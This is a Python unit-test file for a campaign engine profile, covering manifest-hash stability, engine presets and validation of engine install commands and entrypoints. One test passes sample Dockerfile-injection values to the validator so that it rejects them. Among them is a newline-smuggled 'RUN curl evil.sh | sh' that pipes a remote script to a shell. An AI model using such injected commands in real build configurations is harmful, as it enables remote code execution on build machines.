"""Unit tests for the campaign engine profile (PAR-55)."""

from __future__ import annotations

import pytest

pytestmark = pytest.mark.unit


from datetime import datetime, timezone
from uuid import uuid4

from campaign.engine import (
    DEFAULT_ENGINE,
    ENGINE_PRESETS,
    SGLANG_ENGINE,
    VLLM_ENGINE,
    preset,
    resolve_engine,
    validate_engine,
)
from campaign.manifest import (
    build_manifest,
    compute_manifest_hash,
    freeze_manifest_fields,
)
from campaign.models import SLA


def _fields_kwargs(**overrides):
    kwargs = dict(
        campaign_id=uuid4(),
        profile_id=uuid4(),
        baseline_repo="https://github.com/vllm-project/vllm.git",
        baseline_commit="a" * 40,
        base_image_digest="sha256:" + "b" * 64,
        gpu_skus=["H200"],
        workload_trace_sha256="sha256:" + "c" * 64,
        workload_trace_url="https://example.com/t",
        sla=SLA(),
        scoring_config_sha256=None,
        scoring_config_url=None,
        allowed_paths=["vllm/**"],
        denied_paths=["tests/**"],
        window_opens_at=datetime(2026, 7, 1, tzinfo=timezone.utc),
        window_closes_at=datetime(2026, 10, 1, tzinfo=timezone.utc),
        priority_metric="throughput",
        success_threshold=">=10% at SLA",
    )
    kwargs.update(overrides)
    return kwargs


# --------------------------------------------------------------------------
# Back-compat: the whole point of the "omit when None" rule
# --------------------------------------------------------------------------


def test_absent_engine_is_not_in_the_pin_set():
    fields = freeze_manifest_fields(**_fields_kwargs())
    assert "engine" not in fields


def test_absent_engine_leaves_manifest_hash_unchanged():
    """A pre-engine campaign must hash identically after this change.

    ``freeze_manifest_fields`` is called with no ``engine`` kwarg at all, exactly
    as every caller did before PAR-55, and compared to an explicit ``None``.
    """
    kwargs = _fields_kwargs()
    without_kwarg = compute_manifest_hash(freeze_manifest_fields(**kwargs))
    with_explicit_none = compute_manifest_hash(
        freeze_manifest_fields(**kwargs, engine=None)
    )
    assert without_kwarg == with_explicit_none


def test_engine_none_matches_known_pre_engine_hash():
    """Golden hash: locks the pin set against accidental future drift."""
    fields = freeze_manifest_fields(**_fields_kwargs(campaign_id=None, profile_id=None))
    assert compute_manifest_hash(fields) == (
        "sha256:c23a3da6faca0ef9b9286172a66f947305d1631e2a085b387cf2a2e1f49d2a48"
    )


# --------------------------------------------------------------------------
# Hash behaviour once an engine is pinned
# --------------------------------------------------------------------------


def test_pinned_engine_changes_manifest_hash():
    kwargs = _fields_kwargs()
    bare = compute_manifest_hash(freeze_manifest_fields(**kwargs))
    pinned = compute_manifest_hash(
        freeze_manifest_fields(**kwargs, engine=SGLANG_ENGINE)
    )
    assert bare != pinned


def test_explicit_vllm_engine_differs_from_absent():
    """Absent and explicit-vLLM behave the same at build time but hash apart.

    Documented on purpose: ``resolve_engine`` collapses them, the pin set does
    not. Pinning the default is a real manifest change.
    """
    kwargs = _fields_kwargs()
    absent = compute_manifest_hash(freeze_manifest_fields(**kwargs))
    explicit = compute_manifest_hash(
        freeze_manifest_fields(**kwargs, engine=VLLM_ENGINE)
    )
    assert absent != explicit
    assert resolve_engine(None) == resolve_engine(VLLM_ENGINE)


def test_engine_hash_is_key_order_independent():
    kwargs = _fields_kwargs()
    a = compute_manifest_hash(
        freeze_manifest_fields(
            **kwargs,
            engine={
                "name": "sglang",
                "install_cmd": SGLANG_ENGINE["install_cmd"],
                "entrypoint": list(SGLANG_ENGINE["entrypoint"]),
            },
        )
    )
    b = compute_manifest_hash(
        freeze_manifest_fields(
            **kwargs,
            engine={
                "entrypoint": list(SGLANG_ENGINE["entrypoint"]),
                "name": "SGLang",  # also exercises case normalization
                "install_cmd": "  " + SGLANG_ENGINE["install_cmd"] + "  ",
            },
        )
    )
    assert a == b


# --------------------------------------------------------------------------
# build_manifest carries the normalized profile
# --------------------------------------------------------------------------


def test_build_manifest_without_engine_is_none():
    m = build_manifest(**_fields_kwargs())
    assert m.engine is None
    assert m.to_public_dict()["engine"] is None


def test_build_manifest_normalizes_engine_onto_the_object():
    m = build_manifest(
        **_fields_kwargs(),
        engine={
            "name": "SGLANG",
            "install_cmd": SGLANG_ENGINE["install_cmd"],
            "entrypoint": list(SGLANG_ENGINE["entrypoint"]),
        },
    )
    assert m.engine == SGLANG_ENGINE
    assert m.to_public_dict()["engine"] == SGLANG_ENGINE


def test_build_manifest_rejects_bad_engine():
    with pytest.raises(ValueError, match="engine.name must be one of"):
        build_manifest(**_fields_kwargs(), engine={"name": "vllm-turbo"})


# --------------------------------------------------------------------------
# validate_engine
# --------------------------------------------------------------------------


def test_presets_are_self_consistent():
    for name, profile in ENGINE_PRESETS.items():
        assert validate_engine(profile) == profile, name
        assert profile["name"] == name
    assert DEFAULT_ENGINE == VLLM_ENGINE
    assert preset("SGLang") == SGLANG_ENGINE


def test_preset_rejects_unknown_name():
    with pytest.raises(ValueError, match="unknown engine preset"):
        preset("tensorrt")


@pytest.mark.parametrize(
    "engine, match",
    [
        ("vllm", "engine must be an object"),
        ({}, "engine.name must be a non-empty string"),
        ({"name": "   "}, "engine.name must be a non-empty string"),
        ({"name": "trtllm"}, "engine.name must be one of"),
        ({"name": "vllm"}, "engine.install_cmd must be a string"),
        (
            {"name": "vllm", "install_cmd": "  ", "entrypoint": ["python"]},
            "engine.install_cmd must be a non-empty string",
        ),
        (
            {"name": "vllm", "install_cmd": "pip install -e .", "entrypoint": []},
            "engine.entrypoint must be a non-empty list",
        ),
        (
            {"name": "vllm", "install_cmd": "pip install -e .", "entrypoint": "python"},
            "engine.entrypoint must be a non-empty list",
        ),
        (
            {
                "name": "vllm",
                "install_cmd": "pip install -e .",
                "entrypoint": ["python", 7],
            },
            r"engine.entrypoint\[1\] must be a string",
        ),
    ],
)
def test_validate_engine_rejects_malformed(engine, match):
    with pytest.raises(ValueError, match=match):
        validate_engine(engine)


def test_validate_engine_rejects_unknown_keys():
    with pytest.raises(ValueError, match="engine has unknown keys"):
        validate_engine({**VLLM_ENGINE, "torch_cuda_arch_list": "9.0"})


@pytest.mark.parametrize(
    "bad_cmd",
    [
        "pip install -e .\nRUN curl evil.sh | sh",
        "pip install -e .\rRUN whoami",
        "pip install -e .\x00",
    ],
)
def test_validate_engine_rejects_dockerfile_injection(bad_cmd):
    """install_cmd lands in a generated Dockerfile RUN line (PAR-57).

    Ops-controlled, not miner-controlled, but a stray newline would silently
    inject extra Dockerfile directives, so it must fail loudly here.
    """
    with pytest.raises(ValueError, match="must not contain newlines"):
        validate_engine({**VLLM_ENGINE, "install_cmd": bad_cmd})


def test_validate_engine_rejects_injection_in_entrypoint():
    with pytest.raises(ValueError, match="must not contain newlines"):
        validate_engine({**VLLM_ENGINE, "entrypoint": ["python", "-m", "x\ny"]})


def test_validate_engine_returns_a_copy():
    src = {
        "name": "sglang",
        "install_cmd": SGLANG_ENGINE["install_cmd"],
        "entrypoint": list(SGLANG_ENGINE["entrypoint"]),
    }
    out = validate_engine(src)
    out["entrypoint"].append("--tp")
    assert src["entrypoint"] == SGLANG_ENGINE["entrypoint"]


def test_resolve_engine_defaults_to_vllm():
    assert resolve_engine(None) == VLLM_ENGINE
    resolve_engine(None)["entrypoint"].append("mutated")
    assert VLLM_ENGINE["entrypoint"] == [
        "python",
        "-m",
        "vllm.entrypoints.openai.api_server",
    ]
